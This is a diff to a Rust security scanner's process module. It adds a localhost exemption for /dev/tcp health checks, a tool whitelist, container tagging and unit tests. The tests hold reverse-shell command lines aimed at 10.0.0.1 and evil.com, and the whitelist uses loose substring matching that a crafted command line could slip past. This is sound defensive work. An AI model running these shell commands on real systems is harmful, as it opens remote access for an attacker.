@@ -35,6 +35,26 @@ const REVERSE_SHELL_PATTERNS: &[&str] = &[
     "php -r",
 ];
 
+/// Localhost targets in /dev/tcp/ that are health-checks, not reverse shells.
+const DEVTCP_LOCALHOST_TARGETS: &[&str] = &[
+    "/dev/tcp/localhost/",
+    "/dev/tcp/127.0.0.1/",
+    "/dev/tcp/::1/",
+    "/dev/tcp/0.0.0.0/",
+];
+
+/// Known legitimate tools that use python/shell with network sockets.
+/// Whitelisted from the socket-FD reverse shell heuristic.
+const KNOWN_LEGITIMATE_TOOLS: &[&str] = &[
+    "certbot", "ansible", "salt-minion", "salt-call",
+    "pip", "pip3", "apt", "apt-get", "yum", "dnf", "pacman",
+    "snap", "flatpak", "git", "curl", "wget", "ssh", "scp",
+    "rsync", "fail2ban", "unattended-upgrade", "cloud-init",
+    "aws", "gcloud", "az", "docker", "podman", "kubectl",
+    "helm", "terraform", "letsencrypt", "acme.sh",
+    "supervisor", "gunicorn", "uwsgi", "celery", "jupyter",
+];
+
 /// Suspicious cmdline flags/patterns that indicate crypto mining.
 const MINER_CMDLINE_PATTERNS: &[&str] = &[
     "--algo",
@@ -351,6 +371,20 @@ impl ProcessModule {
 
             for pattern in REVERSE_SHELL_PATTERNS {
                 if cmdline_lower.contains(&pattern.to_lowercase()) {
+                    // Special case: /dev/tcp/ to localhost is a health-check, not a reverse shell
+                    if *pattern == "/dev/tcp/" {
+                        let is_localhost = DEVTCP_LOCALHOST_TARGETS
+                            .iter()
+                            .any(|t| cmdline_lower.contains(&t.to_lowercase()));
+                        if is_localhost {
+                            debug!(
+                                pid = proc.pid,
+                                name = %proc.name,
+                                "Skipping /dev/tcp/ match: localhost health-check"
+                            );
+                            continue;
+                        }
+                    }
                     cmdline_match = true;
                     matched_pattern = pattern.to_string();
                     break;
@@ -389,6 +423,23 @@ impl ProcessModule {
                 .any(|s| name_lower == *s || name_lower.starts_with(&format!("{}.", s)));
 
             if !is_shell {
+                continue;
+            }
+
+            // Skip known legitimate tools that use python/shell with sockets.
+            // Check the full cmdline (not just process name) because tools like
+            // certbot run as "python3 /snap/certbot/.../certbot".
+            let is_legitimate_tool = KNOWN_LEGITIMATE_TOOLS.iter().any(|tool| {
+                cmdline_lower.contains(tool)
+            });
+
+            if is_legitimate_tool {
+                debug!(
+                    pid = proc.pid,
+                    name = %proc.name,
+                    cmdline = %truncate_string(&cmdline_joined, 120),
+                    "Skipping known legitimate tool with network sockets"
+                );
                 continue;
             }
 
@@ -601,7 +652,143 @@ impl ScanModule for ProcessModule {
         threats.extend(self.detect_reverse_shells(&processes));
         threats.extend(self.detect_suspicious_binaries(&processes));
 
+        // Enrich threats with container info if applicable
+        for threat in &mut threats {
+            if let Some(pid_str) = threat.details.get("pid") {
+                if let Ok(pid) = pid_str.parse::<u32>() {
+                    if let Some(container) = crate::util::container::detect_container(pid) {
+                        threat.container_id = Some(container.id.clone());
+                        threat.details.insert("container_id".to_string(), container.id);
+                        threat.details.insert("container_runtime".to_string(), container.runtime);
+                        if let Some(name) = container.name {
+                            threat.details.insert("container_name".to_string(), name);
+                        }
+                    }
+                }
+            }
+        }
+
         info!(count = threats.len(), "Process scan complete");
         Ok(threats)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_devtcp_localhost_is_not_reverse_shell() {
+        // Health-check patterns that should NOT be flagged
+        let localhost_cmds = [
+            "/bin/sh -c bash -c 'echo > /dev/tcp/localhost/6333'",
+            "bash -c 'echo > /dev/tcp/127.0.0.1/8080'",
+            "sh -c echo > /dev/tcp/::1/443",
+            "bash -c 'echo > /dev/tcp/0.0.0.0/5432'",
+        ];
+
+        for cmd in &localhost_cmds {
+            let cmd_lower = cmd.to_lowercase();
+            let mut is_match = false;
+
+            for pattern in REVERSE_SHELL_PATTERNS {
+                if cmd_lower.contains(&pattern.to_lowercase()) {
+                    if *pattern == "/dev/tcp/" {
+                        let is_localhost = DEVTCP_LOCALHOST_TARGETS
+                            .iter()
+                            .any(|t| cmd_lower.contains(&t.to_lowercase()));
+                        if is_localhost {
+                            continue;
+                        }
+                    }
+                    is_match = true;
+                    break;
+                }
+            }
+            assert!(
+                !is_match,
+                "Localhost health-check should not be flagged: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_devtcp_remote_is_reverse_shell() {
+        // Actual reverse shells that SHOULD be flagged
+        let remote_cmds = [
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "sh -c bash -c 'echo > /dev/tcp/evil.com/443'",
+        ];
+
+        for cmd in &remote_cmds {
+            let cmd_lower = cmd.to_lowercase();
+            let mut is_match = false;
+
+            for pattern in REVERSE_SHELL_PATTERNS {
+                if cmd_lower.contains(&pattern.to_lowercase()) {
+                    if *pattern == "/dev/tcp/" {
+                        let is_localhost = DEVTCP_LOCALHOST_TARGETS
+                            .iter()
+                            .any(|t| cmd_lower.contains(&t.to_lowercase()));
+                        if is_localhost {
+                            continue;
+                        }
+                    }
+                    is_match = true;
+                    break;
+                }
+            }
+            assert!(is_match, "Remote /dev/tcp/ should be flagged: {}", cmd);
+        }
+    }
+
+    #[test]
+    fn test_certbot_is_whitelisted() {
+        let certbot_cmdlines = [
+            "/snap/certbot/5451/bin/python3 -s /snap/certbot/5451/bin/certbot -q renew",
+            "python3 /usr/bin/certbot renew --quiet",
+            "/usr/bin/python3 /usr/bin/certbot certificates",
+        ];
+
+        for cmd in &certbot_cmdlines {
+            let cmd_lower = cmd.to_lowercase();
+            let is_legitimate = KNOWN_LEGITIMATE_TOOLS
+                .iter()
+                .any(|tool| cmd_lower.contains(tool));
+            assert!(
+                is_legitimate,
+                "Certbot should be whitelisted: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_actual_reverse_shell_not_whitelisted() {
+        let evil_cmds = [
+            "python3 -c 'import socket,subprocess,os'",
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "perl -e 'use Socket;'",
+        ];
+
+        for cmd in &evil_cmds {
+            let cmd_lower = cmd.to_lowercase();
+            let is_legitimate = KNOWN_LEGITIMATE_TOOLS
+                .iter()
+                .any(|tool| cmd_lower.contains(tool));
+            assert!(
+                !is_legitimate,
+                "Actual reverse shell should NOT be whitelisted: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_truncate_string() {
+        assert_eq!(truncate_string("hello", 10), "hello");
+        assert_eq!(truncate_string("hello world", 5), "hello...");
+        assert_eq!(truncate_string("", 5), "");
     }
 }
